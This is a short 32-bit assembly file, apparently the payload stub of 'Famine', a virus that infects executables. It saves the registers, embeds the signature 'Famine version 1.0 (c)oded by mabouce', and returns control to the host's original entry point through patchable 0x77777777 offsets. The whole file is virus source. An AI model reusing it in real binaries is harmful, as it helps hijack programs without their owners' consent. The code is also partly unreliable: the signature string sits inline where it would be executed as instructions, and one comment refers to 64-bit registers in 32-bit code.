BITS 32

SECTION .text

_start_payload:
    enter 0,0 ; push ebp, mov ebp, sub esp, N
    push eax                 ; save all clobbered registers
    push ecx                 ; (rcx and r11 destroyed by kernel)
    push edx
    push esi
    push edi

_infection:
    famine_mark: db "Famine version 1.0 (c)oded by mabouce",10

_end_payload:

    pop edi
    pop esi
    pop edx
    pop ecx
    pop eax

    leave
    call _ret2oep           ; jump to original entry point(oep)
    push eax
    ret

_get_rip:
    mov eax, dword [esp]
    ret

_ret2oep:
    call _get_rip
    sub eax, 0x77777777 ; virus size without ret2oep
    sub eax, 0x77777777 ; new_entry_point
    add eax, 0x77777777 ; old entry_point
    ret